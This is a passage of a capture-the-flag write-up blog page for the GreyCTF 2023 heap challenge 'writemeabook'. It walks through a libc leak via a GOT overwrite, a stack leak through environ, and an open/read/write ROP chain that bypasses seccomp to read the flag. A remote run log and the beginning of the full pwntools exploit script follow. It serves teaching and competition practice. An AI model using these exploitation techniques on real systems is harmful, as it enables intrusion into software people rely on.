+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#leaking-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking libc" href="#leaking-libc">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Leaking libc is very easy given we already setup the entries of <code>@books</code>. We can replace <code>free@GOT</code> by <code>puts@plt</code>. This way the next time free will be called on an entry, it will leak the datas towards which the entry points. Which means <code>free(book[1])</code> leaks the address of stdout within the libc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STDOUT</span> <span class="o">=</span> <span class="mh">0x21a780</span>
+
+<span class="c1"># [...]</span>
+
+<span class="k">def</span> <span class="nf">libc_leak_free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">STDOUT</span>
+
+<span class="c1"># [...]</span>
+
+<span class="c1"># libc leak</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="leaking-the-stack">
+        Leaking the stack
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#leaking-the-stack" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking the stack" href="#leaking-the-stack">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Leaking the libc is cool but given the binary has a seccomp we cannot write one_gadgets on <code>__malloc_hook</code> or <code>__free_hook</code> or within the GOT (of the libc or of the binary) because of the seccomp. We have to do a ROPchain, to do so we could use <code>setcontext</code> but for this libc it is made around <code>rdx</code> that we do not control. Or we could simply leak <code>environ</code> to get the address of a stackframe from which we could return. That&rsquo;s what we gonna do on the <code>rewrite_books</code> stackframe.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">leak_environ</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+<span class="c1"># leak stack (environ)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+        <span class="c1"># 1==</span>
+        <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="c1"># target</span>
+    <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+<span class="n">environ</span> <span class="o">=</span> <span class="n">leak_environ</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="n">stackframe_rewrite</span> <span class="o">=</span> <span class="n">environ</span> <span class="o">-</span> <span class="mh">0x150</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stackframe_rewrite: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stackframe_rewrite</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="ropchain">
+        ROPchain
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Everything is ready for the ROPchain, we cannot use mprotect to use a shellcode within the seccomp forbids it. We just have to set the first entry to the stackframe we&rsquo;d like to hiijack and that&rsquo;s it, then we just need call edit on this entry and the ROPchain is written and triggered at the return of the function!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="n">stackframe_rewrite</span><span class="p">)</span>
+
+<span class="c1"># setup the write to the rewrite stackframe</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+        <span class="c1"># 1==</span>
+        <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+        <span class="n">stackframe_rewrite</span> <span class="c1"># target</span>
+    <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+<span class="c1"># ROPchain</span>
+<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_open</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="n">stackframe_rewrite</span> <span class="o">+</span> <span class="mh">0xde</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span> <span class="c1"># open</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># file descriptor bf ...</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+
+<span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># write</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="c1"># write and trigger the ROPchain</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="profit">
+        PROFIT
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Finally:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">nasm@off:~/Documents/pwn/greycat/writemeabook/dist$ python3 exploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>34.124.157.94 <span class="nv">PORT</span><span class="o">=</span><span class="m">12346</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/chall&#39;</span>                                                                                                 
+    Arch:     amd64-64-little  
+    RELRO:    Partial RELRO
+    Stack:    Canary found                                                                                                                 
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x3fd000<span class="o">)</span>                                                                                                                      
+    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#39;</span>                                       
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#39;</span>                            
+    Arch:     amd64-64-little                                                                                   
+    RELRO:    Partial RELRO                                                                                                                
+    Stack:    Canary found                                                                                                                   
+    NX:       NX enabled                                                                                                                        
+    PIE:      PIE enabled                                                                                                                         
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#39;</span> 
+    Arch:     amd64-64-little                                                                        
+    RELRO:    Partial RELRO                                                                                                                
+    Stack:    No canary found                                                                                                                
+    NX:       NX enabled                                                                                                                     
+    PIE:      PIE enabled                                                                                                                         
+<span class="o">[</span>+<span class="o">]</span> Opening connection to 34.124.157.94 on port 12346: Done                                                                               
+<span class="o">[</span>+<span class="o">]</span> heap: 0x81a000                                                                                          
+<span class="o">[</span>*<span class="o">]</span> Encrypted fp: 0x40484d
+<span class="o">[</span>+<span class="o">]</span> libc: 0x7f162182f000                                                                                                                           
+<span class="o">[</span>+<span class="o">]</span> environ: 0x7ffe60582c98
+<span class="o">[</span>+<span class="o">]</span> stackframe_rewrite: 0x7ffe60582b48
+<span class="o">[</span>*<span class="o">]</span> Loaded <span class="m">218</span> cached gadgets <span class="k">for</span> <span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#39;</span>
+0x7ffe60582b48:   0x7f1621874eb0 pop rax<span class="p">;</span> ret                     
+0x7ffe60582b50:              0x2 SYS_open
+0x7ffe60582b58:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
+0x7ffe60582b60:              0x0 O_RDONLY
+0x7ffe60582b68:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
+0x7ffe60582b70:   0x7ffe60582c28 <span class="o">(</span>+0xb8<span class="o">)</span>
+0x7ffe60582b78:   0x7f16218c0396 syscall<span class="p">;</span> ret
+0x7ffe60582b80:   0x7f16218bf528 pop rax<span class="p">;</span> pop rdx<span class="p">;</span> pop rbx<span class="p">;</span> ret
+0x7ffe60582b88:              0x0 SYS_read
+0x7ffe60582b90:            0x100
+0x7ffe60582b98:      b<span class="s1">&#39;uaaavaaa&#39;</span> &lt;pad rbx&gt;
+0x7ffe60582ba0:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
+0x7ffe60582ba8:         0x81a000
+0x7ffe60582bb0:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
+0x7ffe60582bb8:              0x3
+0x7ffe60582bc0:   0x7f16218c0396 syscall<span class="p">;</span> ret
+0x7ffe60582bc8:   0x7f16218bf528 pop rax<span class="p">;</span> pop rdx<span class="p">;</span> pop rbx<span class="p">;</span> ret
+0x7ffe60582bd0:              0x1 SYS_write
+0x7ffe60582bd8:            0x100
+0x7ffe60582be0:      b<span class="s1">&#39;naaboaab&#39;</span> &lt;pad rbx&gt;
+0x7ffe60582be8:   0x7f162185ae51 pop rsi<span class="p">;</span> ret
+0x7ffe60582bf0:         0x81a000
+0x7ffe60582bf8:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
+0x7ffe60582c00:              0x1
+0x7ffe60582c08:   0x7f16218c0396 syscall<span class="p">;</span> ret
+0x7ffe60582c10:   0x7f16218593e5 pop rdi<span class="p">;</span> ret
+0x7ffe60582c18:           0x1337 <span class="o">[</span>arg0<span class="o">]</span> <span class="nv">rdi</span> <span class="o">=</span> <span class="m">4919</span>
+0x7ffe60582c20:   0x7f16218745f0 <span class="nb">exit</span>
+0x7ffe60582c28:     b<span class="s1">&#39;/flag\x00&#39;</span> b<span class="s1">&#39;/flag\x00&#39;</span>
+0xde
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+Your book has been rewritten!
+
+grey<span class="o">{</span>gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!<span class="o">}</span>
+<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>04<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b9<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b8<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b1<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>c0<span class="se">\x</span>81<span class="se">\x</span>00<span class="se">\[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
+$ <span class="nb">exit</span>
+$ 
+<span class="o">[</span>*<span class="o">]</span> Closed connection to 34.124.157.94 port <span class="m">12346</span>
+<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> sending in interactive
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="conclusion">
+        Conclusion
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#conclusion" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Conclusion" href="#conclusion">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>That was a nice medium heap challenge, even though that was pretty classic. You can find the tasks and the exploit <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook"
+  
+  >here</a
+>.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="annexes">
+        Annexes
+        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Final exploit (with comments):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="c1"># this exploit was generated via</span>
+<span class="c1"># 1) pwntools</span>
+<span class="c1"># 2) ctfmate</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;chall&#34;</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#34;</span>
+<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#34;</span>
+
+<span class="c1"># Set up pwntools for the correct architecture</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
+<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
+<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
+<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
+<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
+<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
+<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
+<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">source /home/nasm/Downloads/pwndbg/gdbinit.py
+</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="n">HEAP_OFFT</span> <span class="o">=</span> <span class="mh">0x3d10</span>
+<span class="n">CHUNK3_OFFT</span> <span class="o">=</span> <span class="mh">0x3d50</span>
+<span class="n">STDOUT</span> <span class="o">=</span> <span class="mh">0x21a780</span>
+
+<span class="k">def</span> <span class="nf">encode_ptr</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">offt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="n">offt</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">value</span>
+
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="k">def</span> <span class="nf">one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+  <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="s1">&#39;--raw&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)]</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">flip</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">flip</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
